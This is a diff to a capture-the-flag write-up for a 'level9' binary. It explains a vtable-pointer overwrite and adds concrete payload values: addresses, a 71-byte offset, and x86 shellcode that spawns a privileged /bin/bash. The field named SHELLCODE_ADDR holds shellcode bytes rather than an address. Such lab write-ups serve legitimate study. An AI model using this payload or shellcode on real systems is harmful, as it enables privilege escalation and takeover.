@@ -16,7 +16,7 @@ then we need to overwrite the `vtable` pointer to point to a fake `vtable` that 
 To solve this level, you can use the following python command to create the payload and run the binary:
 
 ```bash
-./level9 $(python -c 'print("[VTABLE_ADDR]" + "[SHELLCODE_ADDR]" + "a" * OFFSET + "[FAKE_VTABLE_ADDR]")') 
+./level9 $(python -c 'print("[VTABLE_ADDR]" + "[SHELLCODE_ADDR]" + "a" * [OFFSET] + "[FAKE_VTABLE_ADDR]")') 
 ```
 
 ### COMMAND EXPLANATION
@@ -27,3 +27,13 @@ To solve this level, you can use the following python command to create the payl
 - `a * OFFSET` : padding to reach the position of the `vtable` pointer
 
 - `[FAKE_VTABLE_ADDR]` : replace this with the address of the fake `vtable` in little endian format, which contains the address of the shellcode
+
+### USED parameters
+
+`VTABLE_ADDR` = `\x10\xa0\x04\x08`
+
+`SHELLCODE_ADDR` = `\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80`
+
+`OFFSET` = `71`
+
+`FAKE_VTABLE_ADDR` = `\x0c\xa0\x04\x08`
